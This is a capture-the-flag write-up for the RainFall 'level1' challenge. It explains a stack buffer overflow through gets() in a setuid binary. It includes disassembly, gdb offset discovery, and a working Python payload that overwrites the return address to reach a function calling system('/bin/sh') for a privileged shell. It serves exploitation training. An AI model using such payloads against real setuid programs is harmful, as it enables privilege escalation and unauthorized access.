# BUFFER OVERFLOW MODIFYING THE RETURN ADDRESS TO A STACK ADDRESS OPENING A SHELL

## What are the binary permissions ?
```
	level1@RainFall:~$ ls -l
	total 8
	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
	level1@RainFall:~$ getfacl level1
	# file: level1
	# owner: level2
	# group: users
	# flags: ss-
	user::rwx
	user:level2:r-x
	user:level1:r-x
	group::---
	mask::r-x
	other::---
```
Same as before, when we execute the binary, the effective user id (euid) becomes level2's

## We can jump back whereever we want

```asm
08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
```
The base pointer is pushed on the stack, then the stack is 16-byte aligned 

```asm
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
```
Then the stack pointer grows down by 0x50 (80) bytes
And a buffer is allocated at esp+0x10, it has a size of 0x50 - 0x10 = 0x40 (64) bytes, so the buffer is 64 bytes long

```asm
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
```
Gets is called (which is unsafe since it doesn't check the size of the input), if we fill the buffer (64 bytes) + fill the aligment (X bytes) + fill the pushed ebp (4 bytes) we can THEN write the address it will return

## The part we would want to jump on
```
	(gdb) p (char*) 0x8048584
	$1 = 0x8048584 "/bin/sh"
	(gdb) p (char*) 0x80497c0
	$2 = 0x80497c0 ""
	(gdb) p (char*) 0x8048570
	$3 = 0x8048570 "Good... Wait what?\n"
```
The 3 strings used in the following code

```asm
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00 
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret    
```
This function writes the string at 0x8048570 (which is "Good... Wait what?\n") to the file descriptor 1 (stdout), then it calls system with the string at 0x8048584 (which is "/bin/sh"), so if we jump to this function, we will get a shell

## How to send hexa values on stdout

`python -c 'print "a" * X + "\x44\x84\x04\x08"' - | ./level1`

## How many bytes should we put before actually writing the address of the <run> section ?

We already know its something between 68 (64 + 4) and 84 (68 + 16).
Lets try the values

```
~$ python -c 'print "a" * 78' > /tmp/overflow
~$ gdb level1
(gdb) r < /tmp/overflow
Starting program: /home/user/level1/level1 < /tmp/overflow

Program received signal SIGSEGV, Segmentation fault.
0xb7006161 in ?? ()
```
0x61 = a. Meaning that the overflow exceeds by 2 characters.
So We need to put 76 * 'A' then the address of the <run> section

```
~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/overflow
~$ cat /tmp/overflow - | ./level1
```


## **Summary**

- When we execute the binary, the effective user id (euid) becomes level2's
- We can overflow the buffer and jump to the function at 0x8048444 which will write "Good... Wait what?\n" to stdout and then call system("/bin/sh"), giving us a shell with level2's permissions